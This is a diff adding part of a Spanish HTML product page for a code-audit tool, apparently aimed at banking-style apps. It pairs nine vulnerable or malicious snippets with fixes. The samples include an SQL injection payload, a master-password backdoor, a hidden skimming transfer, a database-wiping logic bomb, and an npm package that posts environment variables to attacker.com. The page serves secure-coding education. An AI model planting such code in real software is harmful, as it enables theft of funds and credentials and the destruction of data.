+                        <h4>Timeline de Remediación</h4>
+                        <div class="timeline-progress">
+                            <div class="timeline-milestone completed">
+                                <span class="milestone-date">04/07 02:15</span>
+                                <span class="milestone-status">✓ Detectado</span>
+                            </div>
+                            <div class="timeline-milestone completed">
+                                <span class="milestone-date">04/07 04:20</span>
+                                <span class="milestone-status">✓ Reportado</span>
+                            </div>
+                            <div class="timeline-milestone in-progress">
+                                <span class="milestone-date">04/07 06:00</span>
+                                <span class="milestone-status">⏳ En Curso</span>
+                            </div>
+                            <div class="timeline-milestone pending">
+                                <span class="milestone-date">04/07 10:20</span>
+                                <span class="milestone-status">⧗ Validación</span>
+                            </div>
+                            <div class="timeline-milestone pending">
+                                <span class="milestone-date">04/07 12:00</span>
+                                <span class="milestone-status">⧗ Cierre</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Report Summary Stats -->
+                <div class="report-summary">
+                    <div class="summary-stat">
+                        <div class="stat-number critical">12</div>
+                        <div class="stat-label">Hallazgos Críticos</div>
+                    </div>
+                    <div class="summary-stat">
+                        <div class="stat-number high">7</div>
+                        <div class="stat-label">Hallazgos Altos</div>
+                    </div>
+                    <div class="summary-stat">
+                        <div class="stat-number medium">3</div>
+                        <div class="stat-label">Hallazgos Medios</div>
+                    </div>
+                    <div class="summary-stat">
+                        <div class="stat-number success">✓ 22h</div>
+                        <div class="stat-label">SLA Objetivo</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Ejemplos & Casos de Uso -->
+    <section id="casos-uso" class="casos-uso">
+        <div class="container">
+            <h2 class="section-title">Ejemplos & Casos de Uso</h2>
+            <p class="section-subtitle">Vulnerabilidades reales detectadas y remediadas</p>
+
+            <div class="ejemplos-grid">
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header critical">
+                        <span class="ejemplo-number">01</span>
+                        <h3>🏦 SQL Injection en Transferencias</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Función:</strong> transferMoneyBetweenAccounts() - Transferencias bancarias</p>
+                        <p><strong>Detectado en:</strong> banking/transfers.js:123</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre>const query = `SELECT balance FROM accounts WHERE id = ${accountId} AND pin = '${userPin}'`;
+const result = db.query(query);
+// Atacante: accountId = "1 OR 1=1" para sortear validación</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>const query = 'SELECT balance FROM accounts WHERE id = ? AND pin = ?';
+const result = db.query(query, [accountId, userPin]);
+// Prepared statement - impide inyección</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 💰 Acceso a todas las cuentas bancarias sin validación</p>
+                        <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
+                        <p><strong>CVSS Score:</strong> 9.8</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">02</span>
+                        <h3>🏦 XSS en Dashboard de Trasferencias</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Función:</strong> renderTransferHistory() - Mostrar historial de transferencias</p>
+                        <p><strong>Detectado en:</strong> banking/dashboard.jsx:156</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre>const TransactionNote = ({note}) => (
+  &lt;div dangerouslySetInnerHTML={{__html: note}} /&gt;
+);</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>const TransactionNote = ({note}) => (
+  &lt;div className="safe-note"&gt;{note}&lt;/div&gt;
+);</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Robo de sesión de clientes bancarios, ejecución de código malicioso</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 7.5</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header critical">
+                        <span class="ejemplo-number">03</span>
+                        <h3>🚪 Backdoor Oculto en Auth</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Backdoor administrativo</p>
+                        <p><strong>Detectado en:</strong> auth/login.js:234</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Malicioso:</span>
+                            <pre>function validateLogin(email, password) {
+  // Backdoor oculto - contraseña maestra
+  if (password === 'MASTER_PASS_2024_SECRET') {
+    return generateToken({
+      role: 'ADMIN',
+      userId: '999999',
+      permissions: ['all']
+    });
+  }
+  // Validación normal
+  return validateAgainstDB(email, password);
+}</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>// Remover backdoor completamente
+// Usar solo validación legítima
+function validateLogin(email, password) {
+  const user = getUserFromDB(email);
+  if (!user) return null;
+
+  const isValid = bcrypt.compareSync(password, user.passwordHash);
+  if (!isValid) return null;
+
+  return generateToken({
+    role: user.role,
+    userId: user.id,
+    permissions: user.permissions
+  });
+}</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Acceso administrativo no autorizado, control total del sistema</p>
+                        <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
+                        <p><strong>CVSS Score:</strong> 9.9</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header critical">
+                        <span class="ejemplo-number">04</span>
+                        <h3>💸 Transferencia Oculta a Cuenta Fantasma</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Transferencia automática silenciosa</p>
+                        <p><strong>Detectado en:</strong> banking/transactions.js:445</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Malicioso:</span>
+                            <pre>async function processTransfer(fromAccount, toAccount, amount) {
+  // Transferencia solicitada por usuario
+  await db.transfer(fromAccount, toAccount, amount);
+
+  // ⚠️ TRANSFERENCIA OCULTA
+  if (amount > 10000) {
+    const hiddenAmount = amount * 0.02; // 2% comisión maliciosa
+    await db.transfer(fromAccount, '900000001', hiddenAmount);
+    // Cuenta fantasma: 900000001
+  }
+}</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>async function processTransfer(fromAccount, toAccount, amount) {
+  // Solo transferencia autorizada
+  await db.transfer(fromAccount, toAccount, amount);
+
+  // Log de auditoría
+  await logTransaction({
+    from: fromAccount,
+    to: toAccount,
+    amount: amount,
+    timestamp: new Date(),
+    authorizedBy: getCurrentUser().id
+  });
+}</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 💰 Robo de fondos, pérdida financiera masiva, fraude</p>
+                        <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
+                        <p><strong>CVSS Score:</strong> 9.8</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header critical">
+                        <span class="ejemplo-number">05</span>
+                        <h3>⏰ Bomba Lógica Temporal</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Código con activación futura</p>
+                        <p><strong>Detectado en:</strong> core/scheduler.js:156</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Malicioso:</span>
+                            <pre>setInterval(() => {
+  const now = new Date();
+  const triggerDate = new Date('2024-12-31T23:59:59Z');
+
+  if (now >= triggerDate) {
+    // ⏳ BOMBA LÓGICA - Se activa en fecha específica
+    deleteDatabase();
+    truncateAllTables();
+    disableBackups();
+    // Sistema completamente destruido
+    process.exit(1);
+  }
+}, 3600000); // Verifica cada hora</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>// Remover completamente código con lógica temporal oculta
+// Usar jobs legitimados con auditoría
+
+const schedule = require('node-schedule');
+const { logAudit } = require('./audit');
+
+// Job legítimo con logging
+schedule.scheduleJob('0 2 * * *', async () => {
+  logAudit({
+    action: 'BACKUP_CLEANUP',
+    timestamp: new Date(),
+    authorizedBy: 'SCHEDULED_JOB'
+  });
+  // Operación legítima y auditable
+});</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 💣 Pérdida total de datos, destrucción de sistema</p>
+                        <p><strong>Severidad:</strong> <span class="badge critical">CRÍTICO</span></p>
+                        <p><strong>CVSS Score:</strong> 9.9</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">06</span>
+                        <h3>📦 Ataque a Cadena de Suministro</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Dependencia maliciosa comprometida</p>
+                        <p><strong>Detectado en:</strong> package.json:45 - npm package "utils-helper"</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Paquete Comprometido:</span>
+                            <pre">// package.json
+{
+  "dependencies": {
+    "utils-helper": "^1.2.5"  // ⚠️ COMPROMETIDO
+  }
+}
+
+// En node_modules/utils-helper/index.js
+const axios = require('axios');
+module.exports.format = (data) => {
+  // Robo de datos silencioso
+  axios.post('https://attacker.com/logs', {
+    env: process.env,
+    nodeVersion: process.version,
+    cwd: process.cwd()
+  }).catch(() => {});
+  return data.toString();
+};</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>// Auditar dependencias regularmente
+npm audit
+npm audit fix
+
+// Usar lock files
+npm ci // en lugar de npm install
+
+// Reemplazar con alternativa segura
+{
+  "dependencies": {
+    "string-utils": "^2.1.0"  // Alternativa auditada
+  }
+}</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Acceso a variables de entorno, credenciales, configuración</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 7.8</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">07</span>
+                        <h3>👑 Escalada de Privilegios</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Bypass de verificación de permisos</p>
+                        <p><strong>Detectado en:</strong> api/middleware/permissions.js:78</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre>function checkPermission(req, user) {
+  // ⚠️ Fallo: Verifica role en el cliente
+  if (req.headers['x-user-role'] === 'admin') {
+    return true;
+  }
+  // Cliente puede modificar header
+  if (user.role !== 'admin') return false;
+  return true;
+}</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>function checkPermission(req, user) {
+  // Verificación del lado del servidor
+  const dbUser = getUserFromDatabase(user.id);
+
+  if (dbUser.role !== 'admin') {
+    throw new UnauthorizedError('Insufficient permissions');
+  }
+  return true;
+}</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Acceso administrativo no autorizado, control total</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 7.9</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">08</span>
+                        <h3>🔐 Robo de Tokens JWT</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Token exfiltración con validación débil</p>
+                        <p><strong>Detectado en:</strong> auth/jwt.js:112</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre">// Secret débil y hardcoded
+const JWT_SECRET = 'password123';
+
+function verifyToken(token) {
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    return decoded;
+  } catch (e) {
+    return null; // ⚠️ Falla silenciosa
+  }
+}
+
+// Token nunca expira
+const token = jwt.sign({
+  userId: user.id,
+  role: user.role
+  // Sin expiración
+}, JWT_SECRET);</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>const JWT_SECRET = process.env.JWT_SECRET;
+const REFRESH_SECRET = process.env.REFRESH_SECRET;
+
+const token = jwt.sign({
+  userId: user.id,
+  role: user.role
+}, JWT_SECRET, {
+  expiresIn: '15m',  // Expiración corta
+  algorithm: 'HS256'
+});
+
+const refreshToken = jwt.sign({
+  userId: user.id
+}, REFRESH_SECRET, {
+  expiresIn: '7d'
+});</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 🔓 Sesiones secuestradas, acceso no autorizado permanente</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 8.2</p>
+                    </div>
+                </div>
+
+                <div class="ejemplo-card">
+                    <div class="ejemplo-header warning">
+                        <span class="ejemplo-number">09</span>
+                        <h3>📤 Exfiltración Masiva de Datos</h3>
+                    </div>
+                    <div class="ejemplo-body">
+                        <p><strong>Tipo:</strong> Data extraction a través de API</p>
+                        <p><strong>Detectado en:</strong> api/endpoints/customers.js:234</p>
+                        <div class="code-example vulnerable">
+                            <span class="label">❌ Código Vulnerable:</span>
+                            <pre">app.get('/api/customers', (req, res) => {
+  // Sin paginación - devuelve TODOS los registros
+  const customers = db.query('SELECT * FROM customers');
+
+  res.json(customers);
+  // Atacante: GET /api/customers?limit=999999
+  // Descarga: 2.3M registros con datos sensibles
+});
+
+// Sin validación de rango
+app.get('/api/transactions/:id', (req, res) => {
+  const trans = db.query(
+    'SELECT * FROM transactions WHERE id <= ?',
+    [req.params.id]
+  );
+  res.json(trans); // Devuelve rango entero
+});</pre>
+                        </div>
+                        <div class="code-example solution">
+                            <span class="label">✅ Solución:</span>
+                            <pre>app.get('/api/customers', (req, res) => {
+  const limit = Math.min(req.query.limit || 10, 100);
+  const offset = req.query.offset || 0;
+
+  const customers = db.query(
+    'SELECT id, name FROM customers LIMIT ? OFFSET ?',
+    [limit, offset]
+  );
+
+  res.json({
+    data: customers,
+    total: getTotalCount(),
+    limit,
+    offset
+  });
+});</pre>
+                        </div>
+                        <p><strong>Impacto:</strong> 📊 Acceso a millones de registros, robo masivo de datos</p>
+                        <p><strong>Severidad:</strong> <span class="badge high">ALTO</span></p>
+                        <p><strong>CVSS Score:</strong> 7.6</p>
+                        <p><strong>CVSS Score:</strong> 5.3</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Demo Interactiva -->
+    <section id="demo" class="demo">
+        <div class="container">
+            <h2 class="section-title">Demo Interactiva</h2>
+            <p class="section-subtitle">Prueba el análisis en tiempo real</p>
+
+            <div class="demo-grid">
+                <div class="demo-card">
+                    <h3>📤 Analizar Código</h3>
+                    <p>Pega tu código y obtén un análisis instantáneo:</p>
+                    <textarea id="demoCode" class="demo-textarea" placeholder="// Pega tu código aquí&#10;const query = `SELECT * FROM users WHERE id = ${id}`;">const query = `SELECT * FROM users WHERE id = ${id}`;</textarea>
+                    <button id="demoButton" class="demo-button">Analizar Ahora</button>
+                </div>
+
+                <div class="demo-card demo-results">
+                    <h3>📊 Resultados</h3>
+                    <div id="demoResults" class="demo-output">
+                        <p style="color: var(--text-muted); text-align: center;">Los resultados aparecerán aquí...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="demo-info">
+                <p>
+                    💡 <strong>Nota:</strong> Esta es una demo interactiva que muestra el tipo de análisis que SCR Agent realiza.
+                    Los resultados son simulados para fines de demostración. Para análisis reales, contacta al equipo.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Conclusión -->
+    <section class="conclusion">
+        <div class="container">
+            <h2 class="section-title">Conclusión</h2>
+            <div class="conclusion-content">
+                <p>
+                    SCR Agent es una solución integral de auditoría de código que combina análisis estático avanzado,
+                    investigación forense y seguimiento automático de remediciones. Diseñado para empresas que requieren
+                    máxima visibilidad y control sobre la seguridad de su código.
+                </p>
+                <div class="benefits">
+                    <div class="benefit">
+                        <span class="benefit-icon">⚡</span>
+                        <span>Análisis en tiempo real</span>
+                    </div>
+                    <div class="benefit">
+                        <span class="benefit-icon">🎯</span>
+                        <span>Alta precisión</span>
+                    </div>
+                    <div class="benefit">
+                        <span class="benefit-icon">📊</span>
+                        <span>Trazabilidad completa</span>
+                    </div>
+                    <div class="benefit">
+                        <span class="benefit-icon">🔒</span>
+                        <span>Seguridad garantizada</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <p>&copy; 2024 SCR Agent - Auditoría Inteligente de Código</p>
+            <p>Tecnología de vanguardia en seguridad de aplicaciones</p>
+        </div>
+    </footer>
+
+    <script src="js/main.js"></script>
+    <script src="js/diagrams.js"></script>
+</body>
+</html>
